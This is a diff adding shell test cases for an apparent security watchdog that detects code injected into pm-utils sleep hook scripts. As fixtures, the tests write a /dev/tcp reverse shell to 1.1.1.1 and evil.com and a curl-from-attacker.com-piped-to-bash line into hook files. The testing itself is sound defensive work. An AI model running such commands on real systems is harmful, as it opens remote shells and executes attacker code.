@@ -185,3 +185,44 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-pm-utils -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): pm-utils-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/00logging"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"pm_utils_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\n# 00logging\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\necho "pm-utils sleep"\n' > "${HOOKD}/00logging"
+    run_wd
+    ! cap | grep -q '"event":"pm_utils_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /etc/pm/sleep.d + /usr/lib/pm-utils/sleep.d axes — injection in ANY → alert)" {
+    HOOKD2="${TMP}/lib-sleep.d"; mkdir -p "${HOOKD2}"
+    seed_benign
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-sleep-hook"
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/00logging"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
